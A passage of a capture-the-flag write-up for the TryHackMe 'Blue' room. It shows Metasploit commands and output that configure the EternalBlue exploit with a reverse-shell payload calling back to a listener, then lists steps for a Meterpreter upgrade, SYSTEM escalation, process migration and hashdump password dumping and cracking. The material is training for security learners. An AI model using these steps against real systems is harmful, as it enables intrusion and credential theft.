set payload windows/x64/shell/reverse_tcp
set RHOSTS TARGET_IP
set LHOST 192.168.134.39
show options
```

**Breakdown**

|Component|Purpose|
|---|---|
|`set payload windows/x64/shell/reverse_tcp`|Replaces the default Meterpreter payload with a plain Windows command shell. `x64` matches the target's 64-bit architecture; a 32-bit payload fails on delivery.|
|`set RHOSTS TARGET_IP`|Sets the target address. `set RHOST` (singular) is aliased to the same option and works identically.|
|`set LHOST 192.168.134.39`|Sets the address the target connects back to — the `tun0` address from section 2.3, replacing the auto-populated adapter address.|
|`show options`|Re-prints the configuration for verification. Run this after any `set` sequence rather than trusting the individual confirmation lines.|

**Result**

```shell
msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.48.181.153
RHOST => 10.48.181.153
msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.134.39
LHOST => 192.168.134.39
msf exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.48.181.153    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Win
                                             dows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows
                                              Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded
                                             Standard 7 target machines.


Payload options (windows/x64/shell/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.134.39   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms17_010_eternalblue) > 
```
<div align="center">
<br>
</div>

##### Why we chose a payload instead of using Meterpreter:

Metasploit defaulted to `windows/x64/meterpreter/reverse_tcp`, the more capable option but we were instructed to replace it.

|Payload|What it gives you|Trade-off|
|---|---|---|
|`shell/reverse_tcp`|A raw `cmd.exe` prompt. Standard Windows commands only.|Small, simple, minimal footprint. No file transfer, no privilege tooling, no session management.|
|`meterpreter/reverse_tcp`|A full post-exploitation agent running in memory. Adds file upload/download, credential dumping, process migration, privilege escalation helpers, screenshots.|Larger payload, noisier, more to detect.|

Two reasons drive the choice here. The room's structure treats upgrading a plain shell into a Meterpreter session as its own exercise; starting with Meterpreter skips that lesson. More usefully, the plain shell is the realistic starting point and many footholds arrive as a bare shell from a web vulnerability or a misconfigured service, with no framework agent attached. Knowing how to upgrade one is a transferable skill; being handed Meterpreter by default is not.

Read the payload name as three parts: platform (`windows`), architecture (`x64`), and type (`shell/reverse_tcp`). Architecture mismatch is a common silent failure. A 32-bit payload sent to a 64-bit target produces an exploit that appears to run and delivers nothing.

**On the `RHOST` / `RHOSTS` alias:** the singular form was entered and the plural option was populated. Metasploit maps them, but not every module does, and the confirmation line echoes what was typed rather than what was set. Verify against `show options` rather than the `=>` confirmation.

**What this gives you**

Confirm all required options carry values: `RHOSTS`, `RPORT`, `VERIFY_ARCH`, `VERIFY_TARGET`, `EXITFUNC`, `LHOST`, `LPORT`. Nothing required is empty.

Leave `Exploit target` on `0 Automatic Target`. The module fingerprints the host over SMB and selects a memory layout itself, which is more reliable than manual selection — particularly here, where the host is Server 2012 R2 and the module's explicit target list ends at Server 2012.

Note the three SMB credential fields remain empty, as intended. No authentication is required.

**Next**

Configuration is complete and verified. Execute the exploit and catch the returning connection.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q8 Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target.

==No answer needed==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 3 Escalate
### Q9 If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)

==Answer==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q10 Select this (use MODULE_PATH). Show options, what option are we required to change?

==Answer==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q11 Set the required option, you may need to list all of the sessions to find your target here.

==No answer needed==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q12 Run! If this doesn't work, try completing the exploit from the previous task once more.

==No answer needed==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q13 Once the meterpreter shell conversion completes, select that session for use.

==No answer needed==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q14 Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again.

==No answer needed==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q15 List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

==No answer needed==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q16 Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time.

==No answer needed==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 4 Cracking

Dump the non-default user's password and crack it!
<div align="center">
<br>
<br>
</div>

### Q17 Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user?

==Answer==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q18 Copy this password hash to a file and research how to crack it. What is the cracked password? 

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 5 Final Flags!

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!  

_Completed Blue? Check out Ice: [Link](https://tryhackme.com/room/ice)_

_You can check out the third box in this series, Blaster, here: [Link](https://tryhackme.com/room/blaster)_
<div align="center">
<br>
<br>
</div>

### Q19 Flag1? _This flag can be found at the system root._

==Answer==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q20 Flag2? _This flag can be found at the location where passwords are stored within Windows._

*Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen.

==Answer==
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### Q21 flag3? _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._

==Answer==
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References
